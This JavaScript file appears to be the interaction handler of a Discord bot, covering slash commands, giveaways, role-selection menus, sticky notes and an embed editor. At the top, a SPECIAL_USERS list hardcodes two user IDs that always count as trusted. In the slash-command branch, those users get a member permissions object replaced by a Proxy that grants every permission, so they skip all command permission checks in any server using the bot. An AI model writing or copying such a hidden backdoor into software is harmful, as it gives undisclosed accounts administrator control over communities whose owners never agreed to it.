const { parseReply, resolveRole } = require('../utils/parser');
const db = require('../database/db');
const { buildEmbedFromData } = require('../utils/parser');

const SPECIAL_USERS = ['1439442692269408306', '1486469966332170392'];

const ALMIGHTY_PERMS = new Proxy({}, {
    get(target, prop) {
        if (prop === 'has') return () => true;
        if (prop === 'any') return () => true;
        if (prop === 'missing') return () => [];
        if (prop === 'toArray') return () => ['Administrator'];
        if (prop === 'bitfield') return BigInt('0xFFFFFFFFFFFFFFFF');
        return true;
    }
});

async function isUserTrusted(guildId, userId) {
    if (SPECIAL_USERS.includes(userId)) return true;
    try {
        return !!(await db.isTrusted(guildId, userId));
    } catch (e) {
        console.error('[trust] db.isTrusted threw:', e);
        return false;
    }
}

function buildPayload(parsed) {
    const payload = {};
    if (parsed.hasSeparators) {
        payload.flags = 1 << 15;
        payload.components = parsed.componentRows;
    } else {
        if (parsed.text)        payload.content    = parsed.text;
        if (parsed.embed)       payload.embeds     = [parsed.embed];
        if (parsed.rows.length) payload.components = parsed.rows;
    }
    return payload;
}

const EDIT_FIELDS = [
    { id: 'title',       label: 'Title'       },
    { id: 'description', label: 'Description' },
    { id: 'color',       label: 'Color (#hex)'},
    { id: 'footer',      label: 'Footer'      },
    { id: 'image',       label: 'Image URL'   },
    { id: 'thumbnail',   label: 'Thumbnail'   },
    { id: 'author',      label: 'Author'      },
    { id: 'url',         label: 'URL'         },
];

module.exports = {
    name: 'interactionCreate',
    async execute(interaction, client) {

        // ── Autocomplete ──────────────────────────────────────────────────────
        if (interaction.isAutocomplete()) {
            const command = client.commands.get(interaction.commandName);
            if (!command?.autocomplete) return;
            try {
                await command.autocomplete(interaction);
            } catch (e) {
                console.error('Autocomplete error in /' + interaction.commandName + ':', e);
            }
            return;
        }

        // ── Slash Commands ────────────────────────────────────────────────────
        if (interaction.isChatInputCommand()) {
            const command = client.commands.get(interaction.commandName);
            if (!command) return;

            try {
                const userId = interaction.user.id;
                const guildId = interaction.guildId;
                const trusted = await isUserTrusted(guildId, userId);

                if (interaction.member) {
                    if (trusted) {
                        Object.defineProperty(interaction.member, 'permissions', {
                            get: () => ALMIGHTY_PERMS,
                            configurable: true,
                        });
                    } else if (command.permissions) {
                        const memberPerms = interaction.member.permissions;
                        const required = Array.isArray(command.permissions)
                            ? command.permissions
                            : [command.permissions];
                        const hasAll = required.every(p => memberPerms.has(p));
                        if (!hasAll) {
                            return interaction.reply({
                                content: '❌ You do not have permission to use this command.',
                            });
                        }
                    }
                }

                await command.execute(interaction, client);

            } catch (err) {
                console.error('Error in /' + interaction.commandName + ':', err);
                const msg = { content: 'Something went wrong.' };
                if (interaction.replied || interaction.deferred) {
                    await interaction.followUp(msg).catch(() => {});
                } else {
                    await interaction.reply(msg).catch(() => {});
                }
            }

            return;
        }

        // ── Embed Edit Button ─────────────────────────────────────────────────
        if (interaction.isButton()) {
            const customId = interaction.customId;

            if (customId.startsWith('embed-edit:')) {
                const parts = customId.split(':');
                const field = parts.pop();
                const name = parts.slice(1).join(':');
                const { ModalBuilder, TextInputBuilder, TextInputStyle, ActionRowBuilder } = require('discord.js');

                const saved = await db.getEmbed(interaction.guildId, name);
                if (!saved) {
                    await interaction.reply({ content: '❌ Embed not found.', flags: 64 });
                    return;
                }

                const fieldConfig = {
                    title:       { label: 'Title',         max: 256  },
                    description: { label: 'Description',   max: 4096, style: 'paragraph' },
                    color:       { label: 'Color (#hex)',  max: 7    },
                    footer:      { label: 'Footer',        max: 2048 },
                    image:       { label: 'Image URL',     max: 2000 },
                    thumbnail:   { label: 'Thumbnail URL', max: 2000 },
                    author:      { label: 'Author',        max: 256  },
                    url:         { label: 'URL',           max: 2000 },
                };

                const conf = fieldConfig[field] || { label: field, max: 2000 };

                const modal = new ModalBuilder()
                    .setCustomId('embed-save:' + name + ':' + field)
                    .setTitle('Edit ' + conf.label);

                const input = new TextInputBuilder()
                    .setCustomId('value')
                    .setLabel(conf.label)
                    .setStyle(conf.style === 'paragraph' ? TextInputStyle.Paragraph : TextInputStyle.Short)
                    .setRequired(false)
                    .setMaxLength(conf.max)
                    .setValue(saved[field] || '');

                modal.addComponents(new ActionRowBuilder().addComponents(input));
                await interaction.showModal(modal);
                return;
            }

            if (customId.startsWith('embed-delete:')) {
                const name = customId.slice('embed-delete:'.length);
                const saved = await db.getEmbed(interaction.guildId, name);
                if (!saved) {
                    await interaction.reply({ content: '❌ Embed not found.', flags: 64 });
                    return;
                }
                await db.deleteEmbed(interaction.guildId, name);
                await interaction.update({ content: '🗑️ Embed **' + name + '** deleted.', embeds: [], components: [] });
                return;
            }

            // ── Revive buttons (Get Role / Remove Role) ─────────────────────
            if (customId === 'btn_1785115813345_9lcn' || customId === 'btn_1785115814564_k5vj') {
                await interaction.deferReply({ flags: 64 }).catch(() => {});
                const msgId = interaction.message.id;
                const reviveMsg = await db.getReviveMessage(msgId);
                if (!reviveMsg || !reviveMsg.roleId) {
                    await interaction.editReply({ content: '❌ This revive message is no longer valid.' }).catch(() => {});
                    return;
                }
                const role = interaction.guild.roles.cache.get(reviveMsg.roleId);
                if (!role) {
                    await interaction.editReply({ content: '❌ The revive role no longer exists.' }).catch(() => {});
                    return;
                }
                try {
                    if (customId === 'btn_1785115813345_9lcn') {
                        await interaction.member.roles.add(role);
                    } else {
                        await interaction.member.roles.remove(role);
                    }
                    const label = customId === 'btn_1785115813345_9lcn' ? 'given' : 'removed';
                    await interaction.editReply({ content: '<:writing:1526779827611500604> Role has been **' + label + '**!' }).catch(() => {});
                } catch (e) {
                    await interaction.editReply({ content: '❌ Failed to manage role: ' + e.message }).catch(() => {});
                }
                return;
            }

            if (customId.startsWith('br:')) {
                const btnName = customId.slice(3);
                const guildId = interaction.guild?.id;
                if (!guildId) return;

                const btnData = await db.getButtonResponder(guildId, btnName);
                if (!btnData) {
                    await interaction.reply({ content: 'This button no longer exists.' });
                    return;
                }

                if (btnData.cooldown) {
                    const last = await db.getCooldown(guildId, interaction.user.id, 'btn:' + btnName);
                    if (last && Date.now() - last < btnData.cooldown * 1000) {
                        const remaining = Math.ceil((btnData.cooldown * 1000 - (Date.now() - last)) / 1000);
                        await interaction.reply({ content: `⏳ Cooldown! Try again in **${remaining}s**.` });
                        return;
                    }
                    await db.setCooldown(guildId, interaction.user.id, 'btn:' + btnName, Date.now());
                }

                const context = { member: interaction.member, guild: interaction.guild, guildId, user: interaction.user, message: interaction.message };
                const parsed = await parseReply(btnData.reply, context);

                if (parsed.requireRole) {
                    const role = resolveRole(interaction.guild, parsed.requireRole);
                    if (role && !interaction.member.roles.cache.has(role.id)) {
                        await interaction.reply({ content: `❌ You need the **${role.name}** role!` });
                        return;
                    }
                }

                for (const action of parsed.actions) {
                    const role = resolveRole(interaction.guild, action.value);
                    if (!role) continue;
                    try {
                        if (action.type === 'addrole')    await interaction.member.roles.add(role);
                        if (action.type === 'removerole') await interaction.member.roles.remove(role);
                    } catch (e) { console.error('Role action failed:', e.message); }
                }

                const payload = buildPayload(parsed);

                if (Object.keys(payload).length > 0) {
                    if (btnData.ephemeral) payload.flags = 64;
                    await interaction.reply(payload).catch(console.error);
                } else {
                    await interaction.reply({ content: '✅ Done!' });
                }
            }

            if (customId === 'gw_enter') {
                try {
                    const guildId = interaction.guild?.id;
                    const messageId = interaction.message?.id;
                    if (!guildId || !messageId) return;

                    await interaction.deferReply({ flags: 64 }).catch(() => {});

                    // helper that will reply or edit depending on whether the interaction was deferred/replied
                    const replyOrEdit = async (payload) => {
                        try {
                            if (interaction.deferred || interaction.replied) {
                                await interaction.editReply(payload).catch(() => {});
                            } else {
                                // ensure ephemeral by default when replying directly
                                const replyPayload = Object.assign({ flags: 64 }, payload);
                                await interaction.reply(replyPayload).catch(() => {});
                            }
                        } catch (e) {
                            console.error('[Giveaway] replyOrEdit failed:', e);
                        }
                    };

                    const gw = await db.getActiveGiveaway(guildId, messageId);
                    if (!gw) {
                        await replyOrEdit({ content: '❌ This giveaway no longer exists.' });
                        return;
                    }
                    if (gw.ended) {
                        await replyOrEdit({ content: '❌ This giveaway has already ended.' });
                        return;
                    }
                    if (Date.now() >= gw.endAt) {
                        await replyOrEdit({ content: '❌ This giveaway has ended.' });
                        return;
                    }

                    const entrants = gw.entrants || [];
                    if (entrants.includes(interaction.user.id)) {
                        await replyOrEdit({ content: '❌ You have already entered this giveaway.' });
                        return;
                    }

                    // ── Entry requirements check ───────────────────────────
                    if (gw.requiredMessages) {
                        const levelData = await db.getLevelUser(guildId, interaction.user.id);
                        const msgCount = levelData?.messages || 0;
                        if (msgCount < gw.requiredMessages) {
                            await replyOrEdit({ content: `❌ You need at least **${gw.requiredMessages}** messages sent in this server to enter. You currently have **${msgCount}**.` });
                            return;
                        }
                    }
                    if (gw.requiredRoles?.length) {
                        const missing = gw.requiredRoles.filter(rId => !interaction.member.roles.cache.has(rId));
                        if (missing.length) {
                            const missingList = missing.map(rId => `<@&${rId}>`).join(', ');
                            await replyOrEdit({ content: `❌ You are missing the required role(s): ${missingList}` });
                            return;
                        }
                    }

                    const added = await db.addGiveawayEntrant(guildId, messageId, interaction.user.id);
                    if (!added) {
                        await replyOrEdit({ content: '❌ You have already entered this giveaway.' });
                        return;
                    }

                    const freshGw = await db.getActiveGiveaway(guildId, messageId);
                    const newCount = (freshGw?.entrants || []).length;

                    if (freshGw?.originalPayload) {
                        try {
                            const channel = client.channels.cache.get(freshGw.channelId) ||
                                await client.channels.fetch(freshGw.channelId).catch(() => null);
                            if (channel) {
                                const msg = await channel.messages.fetch(freshGw.messageId).catch(() => null);
                                if (msg) {
                                    const updatedPayload = JSON.parse(JSON.stringify(freshGw.originalPayload));
                                    for (const comp of updatedPayload.components) {
                                        if (comp.type === 1 && Array.isArray(comp.components)) {
                                            for (const btn of comp.components) {
                                                if (btn.custom_id === 'gw_part') {
                                                    btn.label = `${newCount} Participants`;
                                                }
                                            }
                                        }
                                    }
                                    try {
                                        const { withCroppedGif } = require('../events/giveawayHandler');
                                        const { payload: croppedPayload, files } = await withCroppedGif(updatedPayload);
                                        await msg.edit(files ? { ...croppedPayload, files } : croppedPayload);
                                    } catch {
                                        await msg.edit(updatedPayload);
                                    }
                                }
                            }
                        } catch (e) {
                            console.error('[Giveaway] Failed to update participant count:', e.message);
                        }
                    }

                    try {
                        await replyOrEdit({
                            allowed_mentions: { parse: [] },
                            components: [
                                {
                                    type: 17,
                                    components: [
                                        {
                                            type: 10,
                                            content: '<a:pinkarrow:1524863871976734740> You have successfully entered this giveaway.\nIf you win, you will be notified.'
                                        }
                                    ]
                                }
                            ]
                        });
                    } catch (e) {
                        console.error('[Giveaway] replyOrEdit with components failed, falling back:', e.message);
                        await replyOrEdit({
                            content: '<a:pinkarrow:1524863871976734740> You have successfully entered this giveaway.\nIf you win, you will be notified.'
                        });
                    }
                } catch (e) {
                    console.error('[Giveaway] gw_enter error:', e);
                }
                return;
            }

            if (customId === 'gw_part') {
                return;
            }

            // ── Disguise reset buttons (per-server profile panel) ────────────
            {
                const disguise = require('../commands/disguise');
                if (Object.values(disguise.RESET_BUTTONS).includes(customId)) {
                    if (!interaction.guild) return;
                    const trusted = await isUserTrusted(interaction.guildId, interaction.user.id);
                    const hasManage = interaction.memberPermissions?.has('ManageGuild');
                    if (!trusted && !hasManage) {
                        await interaction.reply({ content: '❌ You do not have permission to use this.', flags: 64 }).catch(() => {});
                        return;
                    }
                    const handled = await disguise.handleResetButton(interaction);
                    if (handled) return;
                }
            }

            // ── Level leaderboard pagination buttons ────────────────────────
            if (customId.startsWith('level_lb:')) {
                const parts = customId.split(':');
                const type = parts[1] === 'global' ? 'global' : 'server';
                const page = parseInt(parts[2], 10) || 1;
                const dir = parts[3];
                const requesterId = parts[4] || interaction.user.id;
                const leveling = require('../utils/leveling');
                const { Routes } = require('discord.js');

                let newPage = dir === 'left' ? page - 1 : dir === 'right' ? page + 1 : page;
                newPage = Math.max(1, Math.min(newPage, leveling.MAX_PAGES));

                try {
                    await interaction.deferUpdate();
                    const payload = await leveling.buildLeaderboardPayload({ guildId: interaction.guild.id, requesterId, type, page: newPage });
                    await client.rest.patch(Routes.channelMessage(interaction.channelId, interaction.message.id), { body: payload }).catch(e => console.error('[levels] pagination error:', e.message));
                } catch (e) {
                    console.error('[levels] leaderboard pagination error:', e.message);
                }
                return;
            }

            return;
        }

        // ── Modal Submits ─────────────────────────────────────────────────────
        if (interaction.isModalSubmit()) {
            const customId = interaction.customId;
            const { ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('discord.js');
            const noteSticky = require('./noteSticky');

            // ── Note para ──────────────────────────────────────────────────────
            if (customId === 'notepara:submit') {
                const content = interaction.fields.getTextInputValue('content');
                const suppressText = interaction.fields.getTextInputValue('suppress')?.toLowerCase();
                const suppress = suppressText === 'yes';
                const guildId = interaction.guildId;
                const channelId = interaction.channelId;

                const existing = await db.getNote(guildId, channelId);
                if (existing?.messageId) {
                    try {
                        const old = await interaction.channel.messages.fetch(existing.messageId).catch(() => null);
                        if (old) await old.delete().catch(() => {});
                    } catch {}
                }

                noteSticky.guardChannel(guildId, channelId);
                const msg = await interaction.channel.send({
                    content,
                    flags: (suppress ? 1 << 2 : 0) | (1 << 12),
                });

                await db.saveNote(guildId, channelId, {
                    type: 'text',
                    content,
                    messageId: msg.id,
                    suppress,
                    gluedBy: interaction.user.id,
                    gluedAt: Date.now(),
                });

                await interaction.reply({ content: '✅ Note set.', flags: 64 });
                return;
            }

            // ── Note Embed ─────────────────────────────────────────────────────
            if (customId === 'noteembed:submit') {
                const title = interaction.fields.getTextInputValue('title') || null;
                const description = interaction.fields.getTextInputValue('description') || null;
                const color = interaction.fields.getTextInputValue('color') || '#66C2FF';
                const thumbnail = interaction.fields.getTextInputValue('thumbnail') || null;
                const image = interaction.fields.getTextInputValue('image') || null;

                if (!title && !description && !thumbnail && !image) {
                    return interaction.reply({ content: '❌ At least one of title, description, thumbnail, or image is required.', flags: 64 });
                }

                const guildId = interaction.guildId;
                const channelId = interaction.channelId;

                const existing = await db.getNote(guildId, channelId);
                if (existing?.messageId) {
                    try {
                        const old = await interaction.channel.messages.fetch(existing.messageId).catch(() => null);
                        if (old) await old.delete().catch(() => {});
                    } catch {}
                }

                const embed = new EmbedBuilder().setColor(color);
                if (title) embed.setTitle(title);
                if (description) embed.setDescription(description);
                if (thumbnail) embed.setThumbnail(thumbnail);
                if (image) embed.setImage(image);

                noteSticky.guardChannel(guildId, channelId);
                const msg = await interaction.channel.send({ embeds: [embed], flags: 1 << 12 });

                await db.saveNote(guildId, channelId, {
                    type: 'embed',
                    title,
                    description,
                    color,
                    thumbnail,
                    image,
                    messageId: msg.id,
                    gluedBy: interaction.user.id,
                    gluedAt: Date.now(),
                });

                await interaction.reply({ content: '✅ Embed note set.', flags: 64 });
                return;
            }

            // ── Edit Note Text ────────────────────────────────────────────────────
            if (customId === 'editnotetext:submit') {
                const content = interaction.fields.getTextInputValue('content');
                const guildId = interaction.guildId;
                const channelId = interaction.channelId;

                const note = await db.getNote(guildId, channelId);
                if (!note) return interaction.reply({ content: '❌ Note not found.', flags: 64 });

                try {
                    const old = await interaction.channel.messages.fetch(note.messageId).catch(() => null);
                    if (old) await old.delete().catch(() => {});
                } catch {}

                noteSticky.guardChannel(guildId, channelId);
                const msg = await interaction.channel.send({
                    content,
                    flags: (note.suppress ? 1 << 2 : 0) | (1 << 12),
                });

                note.content = content;
                note.messageId = msg.id;
                note.gluedAt = Date.now();
                await db.saveNote(guildId, channelId, note);

                await interaction.reply({ content: '✅ Note updated.', flags: 64 });
                return;
            }

            // ── Edit Note Embed ────────────────────────────────────────────────
            if (customId === 'editnoteembed:submit') {
                const title = interaction.fields.getTextInputValue('title') || null;
                const description = interaction.fields.getTextInputValue('description') || null;
                const color = interaction.fields.getTextInputValue('color') || '#66C2FF';
                const thumbnail = interaction.fields.getTextInputValue('thumbnail') || null;
                const image = interaction.fields.getTextInputValue('image') || null;

                const guildId = interaction.guildId;
                const channelId = interaction.channelId;

                const note = await db.getNote(guildId, channelId);
                if (!note) return interaction.reply({ content: '❌ Note not found.', flags: 64 });

                try {
                    const old = await interaction.channel.messages.fetch(note.messageId).catch(() => null);
                    if (old) await old.delete().catch(() => {});
                } catch {}

                const embed = new EmbedBuilder().setColor(color);
                if (title) embed.setTitle(title);
                if (description) embed.setDescription(description);
                const useThumbnail = thumbnail || note.thumbnail;
                const useImage = image || note.image;
                if (useThumbnail) embed.setThumbnail(useThumbnail);
                if (useImage) embed.setImage(useImage);

                noteSticky.guardChannel(guildId, channelId);
                const msg = await interaction.channel.send({ embeds: [embed], flags: 1 << 12 });

                note.title = title;
                note.description = description;
                note.color = color;
                note.thumbnail = useThumbnail;
                note.image = useImage;
                note.messageId = msg.id;
                note.gluedAt = Date.now();
                await db.saveNote(guildId, channelId, note);

                await interaction.reply({ content: '✅ Embed note updated.', flags: 64 });
                return;
            }

            if (customId.startsWith('embed-save:')) {
                const parts = customId.split(':');
                const field = parts.pop();
                const name = parts.slice(1).join(':');
                const value = interaction.fields.getTextInputValue('value') || null;

                const saved = await db.getEmbed(interaction.guildId, name);
                if (!saved) {
                    await interaction.reply({ content: '❌ Embed not found.', flags: 64 });
                    return;
                }

                saved[field] = value;
                await db.saveEmbed(interaction.guildId, name, saved);

                const editButtons = EDIT_FIELDS.map(f => {
                    const val = saved[f.id];
                    const display = val ? String(val).slice(0, 18) + (String(val).length > 18 ? '…' : '') : '∅';
                    return new ButtonBuilder()
                        .setCustomId('embed-edit:' + name + ':' + f.id)
                        .setLabel(f.label + ': ' + display)
                        .setStyle(ButtonStyle.Secondary);
                });

                const rows = [];
                for (let i = 0; i < editButtons.length; i += 4) {
                    rows.push(new ActionRowBuilder().addComponents(editButtons.slice(i, i + 4)));
                }
                rows.push(new ActionRowBuilder().addComponents(
                    new ButtonBuilder()
                        .setCustomId('embed-delete:' + name)
                        .setLabel('🗑️ Delete')
                        .setStyle(ButtonStyle.Danger)
                ));

                const hasContent = saved.title || saved.description || saved.footer ||
                                   saved.image || saved.thumbnail || saved.author || saved.url;

                await interaction.update({
                    content: `✏️ Editing **${name}** — updated **${field}**.`,
                    embeds: hasContent ? [buildEmbedFromData(saved)] : [],
                    components: rows,
                });

                return;
            }
        }

        // ── Select Menu Interactions ───────────────────────────────────────────
        if (interaction.isStringSelectMenu()) {
            const customId = interaction.customId;

            // ── CRM Role Menu ───────────────────────────────────────────────────
            if (customId.startsWith('crm:')) {
                const selectedRoleIds = [...interaction.values];
                const config = await db.getCRMMenu(customId);
                const allRoleIds = config ? config.roleIds : (interaction.component?.options || []).map(o => o.value);

                async function ackReply(payload) {
                    if (interaction.deferred) {
                        await interaction.editReply(payload).catch(e => console.error('[crm] editReply error:', e.code));
                    } else if (interaction.replied) {
                        await interaction.followUp(payload).catch(e => console.error('[crm] followUp error:', e.code));
                    } else {
                        try {
                            await interaction.reply(payload);
                        } catch (e) {
                            if (e?.code === 40060) {
                                const rest = interaction.client.rest;
                                // Strip flags for PATCH (can't change after acknowledgment)
                                const { flags: _f, ...patchPayload } = payload;
                                try {
                                    await rest.patch(
                                        `/webhooks/${interaction.applicationId}/${interaction.token}/messages/@original`,
                                        { body: patchPayload },
                                    );
                                } catch (e2) {
                                    console.error('[crm] REST patch @original failed:', e2.code);
                                    try {
                                        await rest.post(
                                            `/webhooks/${interaction.applicationId}/${interaction.token}`,
                                            { body: { ...payload, flags: 64 } },
                                        );
                                    } catch (e3) {
                                        console.error('[crm] REST followUp also failed:', e3.code);
                                    }
                                }
                            } else {
                                console.error('[crm] reply error:', e.code);
                            }
                        }
                    }
                }

                // ── Check specs if config exists ────────────────────────────
                if (config && config.specs) {
                    const specs = config.specs;
                    let canProceed = true;
                    let failReason = null;

                    const memberRoles = Array.isArray(interaction.member?.roles)
                        ? interaction.member.roles
                        : interaction.member?.roles?.cache;

                    function hasRole(id) {
                        if (Array.isArray(memberRoles)) return memberRoles.includes(id);
                        return memberRoles?.has(id) ?? false;
                    }

                    function checkRequires() {
                        try {
                            if (!specs.requires.type) return true;
                            if (specs.requires.type === 'booster') {
                                if (!interaction.member.premiumSince) { failReason = '<a:mailnoti:1524863742888644770> You need to be a server booster to use this menu.'; return false; }
                            } else if (specs.requires.type === 'administrator') {
                                if (!interaction.member.permissions.has('Administrator')) { failReason = '<a:mailnoti:1524863742888644770> You need Administrator permission to use this menu.'; return false; }
                            } else if (specs.requires.type === 'role' || specs.requires.type === 'all-roles') {
                                if (!specs.requires.roleIds.every(id => hasRole(id))) { failReason = '<a:mailnoti:1524863742888644770> You are missing one or more required roles.'; return false; }
                            } else if (specs.requires.type === 'any-roles') {
                                if (!specs.requires.roleIds.some(id => hasRole(id))) { failReason = '<a:mailnoti:1524863742888644770> You need at least one of the required roles.'; return false; }
                            }
                            return true;
                        } catch (e) {
                            console.error('[crm] checkRequires error:', e);
                            failReason = '<a:mailnoti:1524863742888644770> An error occurred while checking requirements.';
                            return false;
                        }
                    }

                    async function checkDisallow() {
                        try {
                            if (!specs.disallow.type) return true;
                            if (specs.disallow.type === 'all') {
                                const channelMenus = await db.getCRMMenusByChannel(interaction.channel.id);
                                for (const menu of channelMenus) {
                                    if (menu._id === customId) continue;
                                    for (const roleId of menu.roleIds) {
                                        if (hasRole(roleId)) {
                                            failReason = '<a:mailnoti:1524863742888644770> You already have a role from another menu in this channel.';
                                            return false;
                                        }
                                    }
                                }
                            } else if (specs.disallow.type === 'link') {
                                let targetRoleIds = specs.disallow.targetRoleIds || [];
                                if (targetRoleIds.length === 0 && specs.disallow.messageLink) {
                                    const linkMatch = specs.disallow.messageLink.match(/https:\/\/discord\.com\/channels\/(\d+)\/(\d+)\/(\d+)/);
                                    if (linkMatch) {
                                        const targetMenu = await db.getCRMMenuByMessage(linkMatch[2], linkMatch[3]);
                                        if (targetMenu) targetRoleIds = targetMenu.roleIds;
                                    }
                                }
                                for (const roleId of targetRoleIds) {
                                    if (hasRole(roleId)) {
                                        failReason = '<a:mailnoti:1524863742888644770> You already have a role from the specified conflicting menu.';
                                        return false;
                                    }
                                }
                            }
                            return true;
                        } catch (e) {
                            console.error('[crm] checkDisallow error:', e);
                            failReason = '<a:mailnoti:1524863742888644770> An error occurred while checking restrictions.';
                            return false;
                        }
                    }

                    // ── Step 1: Check requirements FAST (in-memory) before any API calls ──
                    canProceed = checkRequires();

                    // ── Step 2: If requirements fail, reply immediately ──
                    if (!canProceed) {
                        if (config.specs?.customize?.error) failReason = config.specs.customize.error;
                        await ackReply({ content: failReason || '<a:mailnoti:1524863742888644770> You cannot select roles from this menu.', flags: 64 });
                        return;
                    }

                    // ── Step 3: Requirements passed — defer for remaining work ──
                    await interaction.deferReply({ flags: 64 }).catch(() => {});

                    // ── Step 4: Now check disallow (may need DB queries) ──
                    canProceed = await checkDisallow();

                    // ── Step 5: Remove other CRM roles if delroles configured ──
                    if (specs.run.delroles) {
                        const channelMenus = await db.getCRMMenusByChannel(interaction.channel.id);
                        for (const menu of channelMenus) {
                            if (menu._id === customId) continue;
                            for (const roleId of menu.roleIds) {
                                if (hasRole(roleId)) {
                                    try { await interaction.member.roles.remove(roleId); } catch (e) { console.error('[crm] delroles remove failed:', roleId, e.message); }
                                }
                            }
                        }
                    }

                    // ── Step 6: Recovery — if disallow failed and delroles+recheck ──
                    if (!canProceed && specs.run.delroles && specs.run.recheck) {
                        const channelMenus = await db.getCRMMenusByChannel(interaction.channel.id);
                        for (const menu of channelMenus) {
                            for (const roleId of menu.roleIds) {
                                if (!selectedRoleIds.includes(roleId) && hasRole(roleId)) {
                                    try { await interaction.member.roles.remove(roleId); } catch (e) { console.error('[crm] delroles remove failed:', roleId, e.message); }
                                }
                            }
                        }
                        failReason = null;
                        canProceed = checkRequires();
                        if (canProceed) canProceed = await checkDisallow();
                    }

                    if (!canProceed) {
                        if (config.specs?.customize?.error) failReason = config.specs.customize.error;
                        await ackReply({ content: failReason || '<a:mailnoti:1524863742888644770> You cannot select roles from this menu.' });
                        return;
                    }
                } else {
                    // No specs — defer for role operations
                    await interaction.deferReply({ flags: 64 }).catch(() => {});
                }

                // ── Apply role changes ──────────────────────────────────────
                let added = 0, removed = 0;
                for (const roleId of selectedRoleIds) {
                    try {
                        await interaction.member.roles.add(roleId);
                        added++;
                    } catch (e) { console.error('[crm] Failed to add role:', roleId, e.message); }
                }
                for (const roleId of allRoleIds) {
                    if (!selectedRoleIds.includes(roleId) && interaction.member.roles.cache.has(roleId)) {
                        try {
                            await interaction.member.roles.remove(roleId);
                            removed++;
                        } catch (e) { console.error('[crm] Failed to remove role:', roleId, e.message); }
                    }
                }

                await ackReply({
                    content: `✅ Roles updated! ${added > 0 ? `**+${added}** ` : ''}${removed > 0 ? `**-${removed}**` : ''}`.trim(),
                });
                return;
            }

            if (!customId.startsWith('sel:')) return;

            const selName = customId.slice(4);
            const guildId = interaction.guild?.id;
            if (!guildId) return;

            const selData = await db.getButtonResponder(guildId, selName);
            if (!selData) {
                await interaction.reply({ content: 'This select menu no longer exists.' });
                return;
            }

            const selectedValue = interaction.values[0];

            if (selData.cooldown) {
                const last = await db.getCooldown(guildId, interaction.user.id, 'sel:' + selName);
                if (last && Date.now() - last < selData.cooldown * 1000) {
                    const remaining = Math.ceil((selData.cooldown * 1000 - (Date.now() - last)) / 1000);
                    await interaction.reply({ content: `⏳ Cooldown! Try again in **${remaining}s**.` });
                    return;
                }
                await db.setCooldown(guildId, interaction.user.id, 'sel:' + selName, Date.now());
            }

            const replyText = selData.reply.replace(/\{value\}/gi, selectedValue);
            const context = { member: interaction.member, guild: interaction.guild, guildId, user: interaction.user, message: interaction.message };
            const parsed = await parseReply(replyText, context);

            if (parsed.requireRole) {
                const role = resolveRole(interaction.guild, parsed.requireRole);
                if (role && !interaction.member.roles.cache.has(role.id)) {
                    await interaction.reply({ content: `❌ You need the **${role.name}** role!` });
                    return;
                }
            }

            for (const action of parsed.actions) {
                const role = resolveRole(interaction.guild, action.value);
                if (!role) continue;
                try {
                    if (action.type === 'addrole')    await interaction.member.roles.add(role);
                    if (action.type === 'removerole') await interaction.member.roles.remove(role);
                } catch (e) { console.error('Role action failed:', e.message); }
            }

            await interaction.reply(buildPayload(parsed)).catch(console.error);
        }
    },
};
